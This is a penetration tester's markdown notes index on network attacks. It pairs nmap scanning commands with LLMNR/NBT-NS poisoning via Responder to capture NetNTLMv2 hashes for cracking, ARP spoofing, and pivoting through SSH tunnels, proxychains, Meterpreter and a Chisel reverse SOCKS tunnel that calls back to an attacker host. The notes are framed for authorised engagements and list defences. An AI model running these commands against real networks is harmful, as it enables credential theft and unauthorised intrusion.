# Networking — Offensive Notes Overview

Index for network-layer attacks and the pivoting skills that tie an engagement together. See [GPEN Cheatsheet](../GPEN%20Cheatsheet/README.md) for the SANS pivoting handout.

## Contents

- [Notes in this folder](#notes-in-this-folder)
- [Scanning & enumeration (the front door)](#scanning--enumeration-the-front-door)
- [Common LAN attacks (concept level)](#common-lan-attacks-concept-level)
- [Pivoting & tunneling (turn one host into a route)](#pivoting--tunneling-turn-one-host-into-a-route)

## Notes in this folder

- [VLAN Hopping](VLAN%20Hopping.md) — switch spoofing and double tagging on the link layer
- [Password Attacks & Brute Forcing](Password%20Attacks%20%26%20Brute%20Forcing.md) — dictionary/brute/spray across protocols + offline hash cracking
- [Remote Access & Getting a Shell](Remote%20Access%20%26%20Getting%20a%20Shell.md) — SSH, WinRM/evil-winrm, RDP, SMB exec, and DB clients to turn creds into a session

## Scanning & enumeration (the front door)

```bash
# Host discovery (ping sweep) to find live hosts
nmap -sn <subnet>

# Default scripts + versions, save all output formats
nmap -sC -sV -oA scan <target>

# Full TCP port sweep, then a targeted service scan on what's open
nmap -p- -T4 -oA allports <target>

# UDP (slow) — catches SNMP / DNS / TFTP that TCP misses
nmap -sU --top-ports 100 <target>
```

Always save output (`-oA`) so results are in the report and re-usable.

## Common LAN attacks (concept level)

- **LLMNR / NBT-NS / mDNS poisoning** — respond to broadcast name lookups to capture NetNTLM hashes (Responder). Fix: disable these fallbacks.
- **ARP spoofing** — MITM on a flat segment; useful for capture, high-risk for stability — confirm scope.
- **[VLAN Hopping](VLAN%20Hopping.md)** — reach VLANs you shouldn't via DTP or double-tagging.
- **Rogue DHCP / DNS** — hand out attacker gateway/resolver.

```bash
# Poison LLMNR/NBT-NS to capture NetNTLMv2 hashes, then crack with hashcat -m 5600
responder -I <interface> -wF
```

Detection/defense for all of the above: segmentation, DHCP snooping, dynamic ARP inspection, disabling DTP, and disabling legacy name-resolution protocols.

## Pivoting & tunneling (turn one host into a route)

Once you own a host with a second interface, use it to reach networks you can't touch directly.

```bash
# Local forward: expose one internal service on your localhost
ssh -L 8080:internal-host:80 user@pivot

# Dynamic SOCKS proxy: route whole tools through the pivot
ssh -D 1080 user@pivot
proxychains nmap -sT -Pn internal-host   # run tools through the proxy
```

- **Chisel / ligolo-ng** — when SSH isn't available; build TCP/SOCKS tunnels through the foothold.
- **Meterpreter:** `run autoroute` + `socks_proxy` module for the same effect from a Metasploit session.

```bash
# Chisel reverse SOCKS when there's no SSH: server on attacker, client on the pivot
./chisel server -p 8000 --reverse            # attacker
./chisel client <attacker-ip>:8000 R:socks   # on the compromised pivot
```

Rule of thumb: enumerate the pivot's `ip a` / `ss -tulpn` first, then forward only what you need. Keep a diagram of your tunnels for the report.
